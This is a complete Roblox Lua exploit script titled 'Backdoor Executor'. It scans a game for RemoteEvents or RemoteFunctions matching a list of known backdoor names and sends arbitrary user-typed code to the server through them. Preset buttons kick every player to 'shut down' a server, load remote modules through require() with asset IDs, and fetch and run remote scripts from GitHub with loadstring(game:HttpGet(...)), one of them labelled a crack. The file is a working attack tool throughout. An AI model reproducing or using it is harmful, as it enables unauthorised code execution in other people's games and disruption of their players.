local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "BackdoorExecutor"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local function showNotification(title, text, duration)
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = title,
Text = text,
Duration = duration or 3
})
end

local TweenService = game:GetService("TweenService")

local buttonCache = {}

local function animateClick(button)
if not buttonCache[button] then
buttonCache[button] = {
Position = button.Position,
Size = button.Size
}
end

local original = buttonCache[button]  

local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {  
	Position = original.Position + UDim2.new(0, 0, 0, 2),  
	Size = original.Size - UDim2.new(0, 0, 0, 2)  
})  

local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {  
	Position = original.Position,  
	Size = original.Size  
})  

pressTween:Play()  
pressTween.Completed:Connect(function()  
	releaseTween:Play()  
end)

end

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 450, 0, 300)
Frame.Position = UDim2.new(0.5, -225, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.ClipsDescendants = true

local FloatButton = Instance.new("ImageButton", ScreenGui)
FloatButton.Name = "FloatToggleButton"
FloatButton.Size = UDim2.new(0, 50, 0, 50)
FloatButton.Position = UDim2.new(1, -60, 0, 50)
FloatButton.AnchorPoint = Vector2.new(1, 0)
FloatButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
FloatButton.BackgroundTransparency = 0.3
FloatButton.BorderSizePixel = 0
FloatButton.AutoButtonColor = true
FloatButton.Image = "rbxassetid://73002885569080"

FloatButton.Active = true
FloatButton.Draggable = true

local FloatUICorner = Instance.new("UICorner", FloatButton)
FloatUICorner.CornerRadius = UDim.new(0, 8)

local menuVisible = true
FloatButton.MouseButton1Click:Connect(function()
menuVisible = not menuVisible
Frame.Visible = menuVisible
end)

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 8)

local InnerGlow = Instance.new("ImageLabel", Frame)
InnerGlow.Name = "InnerGlow"
InnerGlow.BackgroundTransparency = 1
InnerGlow.Image = "rbxassetid://1316045217"
InnerGlow.ImageColor3 = Color3.fromRGB(50, 50, 50)
InnerGlow.ImageTransparency = 0.95
InnerGlow.ScaleType = Enum.ScaleType.Slice
InnerGlow.SliceCenter = Rect.new(10, 10, 118, 118)
InnerGlow.Size = UDim2.new(1, -4, 1, -4)
InnerGlow.Position = UDim2.new(0, 2, 0, 2)
InnerGlow.ZIndex = 5

local TitleBar = Instance.new("Frame", Frame)
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2

local UICornerTitle = Instance.new("UICorner", TitleBar)
UICornerTitle.CornerRadius = UDim.new(0, 8)
UICornerTitle.CornerRadius = UDim.new(0, 8, 0, 0)

local Image = Instance.new("ImageLabel", TitleBar)
Image.Size = UDim2.new(0, 20, 0, 20)
Image.Position = UDim2.new(0, 10, 0.5, -10)
Image.BackgroundTransparency = 1
Image.Image = "rbxassetid://73002885569080"

local Title = Instance.new("TextLabel", TitleBar)
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 40, 0, 0)
Title.Text = "Backdoor Executor (Made by Conta Teste)"
Title.TextColor3 = Color3.new(1,1,1)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left

local CloseButton = Instance.new("TextButton", TitleBar)
CloseButton.Size = UDim2.new(0, 30, 1, 0)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.new(1,1,1)
CloseButton.BackgroundTransparency = 1
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 20

CloseButton.MouseEnter:Connect(function()
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.BackgroundTransparency = 0
local UICorner = Instance.new("UICorner", CloseButton)
UICorner.CornerRadius = UDim.new(0, 8)
end)

CloseButton.MouseLeave:Connect(function()
CloseButton.BackgroundTransparency = 1
end)

CloseButton.MouseButton1Click:Connect(function()
if ScreenGui then
ScreenGui:Destroy()
end
end)

local MinimizeButton = Instance.new("TextButton", TitleBar)
MinimizeButton.Size = UDim2.new(0, 30, 1, 0)
MinimizeButton.Position = UDim2.new(1, -60, 0, 0)
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.new(1,1,1)
MinimizeButton.BackgroundTransparency = 1
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.TextSize = 20

local isMinimized = false
local originalSize = Frame.Size

MinimizeButton.MouseButton1Click:Connect(function()
isMinimized = not isMinimized

local TweenService = game:GetService("TweenService")  
local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad)  

if isMinimized then  
MinimizeButton.Text = "+"  
TweenService:Create(Frame, tweenInfo, {  
    Size = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 30)  
}):Play()

else
MinimizeButton.Text = "–"
TweenService:Create(Frame, tweenInfo, {
Size = originalSize
}):Play()
end
end)

local Tabs = Instance.new("Frame", Frame)
Tabs.Size = UDim2.new(1, 0, 0, 30)
Tabs.Position = UDim2.new(0, 0, 0, 30)
Tabs.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Tabs.BorderSizePixel = 0

local UICornerTabs = Instance.new("UICorner", Tabs)
UICornerTabs.CornerRadius = UDim.new(0, 0, 0, 8)

local ExecutorTab = Instance.new("TextButton", Tabs)
ExecutorTab.Size = UDim2.new(0.5, 0, 1, 0)
ExecutorTab.Position = UDim2.new(0, 0, 0, 0)
ExecutorTab.Text = "Executor"
ExecutorTab.TextColor3 = Color3.new(1,1,1)
ExecutorTab.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ExecutorTab.Font = Enum.Font.Gotham
ExecutorTab.TextSize = 14

local ExecutorTabCorner = Instance.new("UICorner", ExecutorTab)
ExecutorTabCorner.CornerRadius = UDim.new(0, 8, 0, 0)

local ScriptsTab = Instance.new("TextButton", Tabs)
ScriptsTab.Size = UDim2.new(0.5, 0, 1, 0)
ScriptsTab.Position = UDim2.new(0.5, 0, 0, 0)
ScriptsTab.Text = "Scripts"
ScriptsTab.TextColor3 = Color3.new(1,1,1)
ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScriptsTab.Font = Enum.Font.Gotham
ScriptsTab.TextSize = 14

local ScriptsTabCorner = Instance.new("UICorner", ScriptsTab)
ScriptsTabCorner.CornerRadius = UDim.new(0, 8)

local MainContent = Instance.new("Frame", Frame)
MainContent.Size = UDim2.new(1, 0, 1, -60)
MainContent.Position = UDim2.new(0, 0, 0, 60)
MainContent.BackgroundTransparency = 1

local ExecutorContent = Instance.new("Frame", MainContent)
ExecutorContent.Size = UDim2.new(1, 0, 1, 0)
ExecutorContent.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox", ExecutorContent)
TextBox.PlaceholderText = 'Enter Code Here'
TextBox.Text = ""
TextBox.Size = UDim2.new(1, -20, 0, 150)
TextBox.Position = UDim2.new(0, 10, 0, 10)
TextBox.TextWrapped = true
TextBox.ClearTextOnFocus = false
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextBox.Font = Enum.Font.Code
TextBox.TextSize = 14
TextBox.MultiLine = true

local UICornerTextBox = Instance.new("UICorner", TextBox)
UICornerTextBox.CornerRadius = UDim.new(0, 6)

local ButtonContainer = Instance.new("Frame", ExecutorContent)
ButtonContainer.Size = UDim2.new(1, -20, 0, 30)
ButtonContainer.Position = UDim2.new(0, 10, 0, 170)
ButtonContainer.BackgroundTransparency = 1

local ScanButton = Instance.new("TextButton", ButtonContainer)
ScanButton.Size = UDim2.new(0.32, -5, 1, 0)
ScanButton.Position = UDim2.new(0, 0, 0, 0)
ScanButton.Text = "Scan"
ScanButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ScanButton.TextColor3 = Color3.new(1, 1, 1)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 14

local UICornerScan = Instance.new("UICorner", ScanButton)
UICornerScan.CornerRadius = UDim.new(0, 6)

local ExecuteButton = Instance.new("TextButton", ButtonContainer)
ExecuteButton.Size = UDim2.new(0.32, -5, 1, 0)
ExecuteButton.Position = UDim2.new(0.34, 0, 0, 0)
ExecuteButton.Text = "Execute"
ExecuteButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ExecuteButton.TextColor3 = Color3.new(1, 1, 1)
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.TextSize = 14

local UICornerExecute = Instance.new("UICorner", ExecuteButton)
UICornerExecute.CornerRadius = UDim.new(0, 6)

local ClearButton = Instance.new("TextButton", ButtonContainer)
ClearButton.Size = UDim2.new(0.32, -5, 1, 0)
ClearButton.Position = UDim2.new(0.68, 0, 0, 0)
ClearButton.Text = "Clear"
ClearButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ClearButton.TextColor3 = Color3.new(1, 1, 1)
ClearButton.Font = Enum.Font.GothamBold
ClearButton.TextSize = 14

local UICornerClear = Instance.new("UICorner", ClearButton)
UICornerClear.CornerRadius = UDim.new(0, 6)

local ScriptsContent = Instance.new("ScrollingFrame", MainContent)
ScriptsContent.Size = UDim2.new(1, 0, 1, 0)
ScriptsContent.BackgroundTransparency = 1
ScriptsContent.ScrollBarThickness = 5
ScriptsContent.Visible = false

local UIListLayout = Instance.new("UIListLayout", ScriptsContent)
UIListLayout.Padding = UDim.new(0, 5)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local margin = 20

local function addSection(text)
local sectionLabel = Instance.new("TextLabel", ScriptsContent)
sectionLabel.Size = UDim2.new(1, -margin * 2, 0, 30)
sectionLabel.BackgroundTransparency = 1
sectionLabel.Text = text
sectionLabel.TextColor3 = Color3.new(1, 1, 1)
sectionLabel.Font = Enum.Font.GothamBold
sectionLabel.TextSize = 16
sectionLabel.TextXAlignment = Enum.TextXAlignment.Left

local padding = Instance.new("UIPadding", sectionLabel)  
padding.PaddingLeft = UDim.new(0, margin)  
padding.PaddingRight = UDim.new(0, margin)

end

local function addScriptButton(name, code)
local outer = Instance.new("Frame", ScriptsContent)
outer.Size = UDim2.new(1, 0, 0, 40)
outer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", outer)  
padding.PaddingLeft = UDim.new(0, margin)  
padding.PaddingRight = UDim.new(0, margin)  

local button = Instance.new("TextButton", outer)  
button.Size = UDim2.new(1, 0, 1, 0)  
button.Text = name  
button.TextColor3 = Color3.new(1, 1, 1)  
button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
button.Font = Enum.Font.Gotham  
button.TextSize = 14  
button.AutoButtonColor = true  

local UICorner = Instance.new("UICorner", button)  
UICorner.CornerRadius = UDim.new(0, 6)  

button.MouseEnter:Connect(function()  
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)  
end)  

button.MouseLeave:Connect(function()  
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
end)  

button.MouseButton1Click:Connect(function()  
    animateClick(button)  
    TextBox.Text = code  
    ExecutorTab.BackgroundColor3 = Color3.fromRGB(25, 25, 25)  
    ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)  
    ExecutorContent.Visible = true  
    ScriptsContent.Visible = false  
end)

end

local function addLocalScriptButton(name, code)
local outer = Instance.new("Frame", ScriptsContent)
outer.Size = UDim2.new(1, 0, 0, 40)
outer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", outer)  
padding.PaddingLeft = UDim.new(0, margin)  
padding.PaddingRight = UDim.new(0, margin)  

local button = Instance.new("TextButton", outer)  
button.Size = UDim2.new(1, 0, 1, 0)  
button.Text = name  
button.TextColor3 = Color3.new(1, 1, 1)  
button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
button.Font = Enum.Font.Gotham  
button.TextSize = 14  
button.AutoButtonColor = true  

local UICorner = Instance.new("UICorner", button)  
UICorner.CornerRadius = UDim.new(0, 6)  

button.MouseEnter:Connect(function()  
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)  
end)  

button.MouseLeave:Connect(function()  
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
end)  

button.MouseButton1Click:Connect(function()  
    animateClick(button)  
    local success, err = pcall(function()  
        loadstring(code)()  
    end)  

    if success then  
        showNotification("Success", "Successfully Executed", 2)  
    else  
        showNotification("Error", "Error: " .. tostring(err):sub(1, 50), 3)  
    end  
end)

end

addSection("Server Side Scripts")

addScriptButton("Sensation Hub", 'require(100263845596551)("'..game.Players.LocalPlayer.Name..'", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")')

addScriptButton("R6 Convert", 'require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')

addScriptButton("Grab Knife V4 (R6 Only)", 'require(18665717275).load("' .. game.Players.LocalPlayer.Name .. '")')

addScriptButton("C4 Bomb", 'require(0x1767bf813)("' .. game.Players.LocalPlayer.Name .. '")')

addScriptButton("Shutdown Server", [[
for _, v in pairs(game.Players:GetPlayers()) do
v:Kick("Server has Shutdown")
end
]])

addScriptButton("Hint", [[
Instance.new("Hint", workspace).Text = "Text Here"
]])

addSection("Client Side Scripts")

addLocalScriptButton("Infinite Yield", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
]])

addLocalScriptButton("Fly GUI V3", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
]])

addLocalScriptButton("Keyboard", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
]])

ExecutorTab.MouseButton1Click:Connect(function()
animateClick(ExecutorTab)
ExecutorTab.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ExecutorContent.Visible = true
ScriptsContent.Visible = false
end)

ScriptsTab.MouseButton1Click:Connect(function()
animateClick(ScriptsTab)
ExecutorTab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScriptsTab.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ExecutorContent.Visible = false
ScriptsContent.Visible = true
end)

local lastFoundRemote = nil

local function findRemote()
local searchRoots = {
game:GetService("ReplicatedStorage"),
game:GetService("Workspace"),
game:GetService("Lighting"),
game:GetService("Players"),
game:GetService("StarterGui"),
game:GetService("StarterPack"),
game:GetService("StarterPlayer"),
game:GetService("Teams"),
game:GetService("SoundService"),
game:GetService("Chat"),
game:GetService("CoreGui"),
game
}

local backdoorRemotes = {  
    "DarkDex_Loadstring",  
    "HDAdminFramework",  
    "RemoteEvent",  
    "Execute",  
    "Backdoor",  
    "Backdoored",  
    "Infected",  
    "ScriptInjector",  
    "Inject",  
    "loadstring",  
    "RetroStudioData",  
    "SS",  
    "RetroStudioData_" .. tostring(game.PlaceId)  
}  

for _, root in ipairs(searchRoots) do  
    for _, obj in ipairs(root:GetDescendants()) do  
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then  
            for _, remoteName in ipairs(backdoorRemotes) do  
                if obj.Name == remoteName then  
                    return obj  
                end  
            end  
        end  
    end  
end  

return nil

end

ScanButton.MouseButton1Click:Connect(function()
animateClick(ScanButton)
local found = findRemote()
if found then
lastFoundRemote = found
ScanButton.Text = "Remote Event Found: " .. found.Name
ScanButton.BackgroundColor3 = Color3.fromRGB(40, 120, 40)
showNotification("Success", "Remote Event Found: "..found.Name, 3)
else
lastFoundRemote = nil
ScanButton.Text = "Game Not Backdoored"
ScanButton.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
showNotification("Error", "Game Not Backdoored", 3)
end
task.wait(2)
ScanButton.Text = "Scan"
ScanButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
end)

ExecuteButton.MouseButton1Click:Connect(function()
animateClick(ExecuteButton)
local requireCode = TextBox.Text
if requireCode == "" then
ExecuteButton.Text = "No Code"
showNotification("Error", "No Code Provided", 3)
task.wait(2)
ExecuteButton.Text = "Execute"
return
end

if lastFoundRemote and lastFoundRemote:IsA("RemoteEvent") then  
    pcall(function()  
        lastFoundRemote:FireServer(requireCode)  
    end)  
    ExecuteButton.Text = "Executed"  
    showNotification("Success", "Code Successfully Executed", 3)  

elseif lastFoundRemote and lastFoundRemote:IsA("RemoteFunction") then  
    pcall(function()  
        lastFoundRemote:InvokeServer(requireCode)  
    end)  
    ExecuteButton.Text = "Executed"  
    showNotification("Success", "Code Successfully Executed", 3)  

else  
    showNotification("Error", "Click 'Scan' First", 3)  
    ExecuteButton.Text = "Click 'Scan'"  
    task.wait(2)  
    ExecuteButton.Text = "Execute"  
    return  
end  

task.wait(2)  
ExecuteButton.Text = "Execute"

end)

ClearButton.MouseButton1Click:Connect(function()
animateClick(ClearButton)
TextBox.Text = ""
ClearButton.Text = "Cleared"
showNotification("Success", "Successfully Cleared", 1)
task.wait(1)
ClearButton.Text = "Clear"
end)

local buttons = {ScanButton, ExecuteButton, ClearButton}

for _, button in ipairs(buttons) do
button.MouseEnter:Connect(function()
if button == ScanButton and ScanButton.Text ~= "Scan" then return end
if button == ExecuteButton and ExecuteButton.Text ~= "Execute" then return end
if button == ClearButton and ClearButton.Text ~= "Clear" then return end

button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
end)  

button.MouseLeave:Connect(function()  
    if button == ScanButton and ScanButton.Text ~= "Scan" then return end  
    if button == ExecuteButton and ExecuteButton.Text ~= "Execute" then return end  
    if button == ClearButton and ClearButton.Text ~= "Clear" then return end  

    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
end)
end
